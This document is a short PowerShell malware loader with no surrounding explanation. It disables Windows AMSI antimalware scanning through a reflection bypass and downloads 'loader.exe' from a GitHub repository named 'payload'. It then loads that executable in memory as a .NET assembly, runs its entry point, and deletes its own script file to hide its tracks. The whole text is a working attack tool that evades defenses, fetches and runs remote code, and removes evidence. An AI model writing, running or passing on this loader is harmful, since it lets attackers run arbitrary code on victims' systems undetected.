
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


$exeUrl = "https://raw.githubusercontent.com/zhangsipng/payload/main/loader.exe"
$bytes = (New-Object Net.WebClient).DownloadData($exeUrl)


$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @(,[string[]] @()))

Start-Sleep 2
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue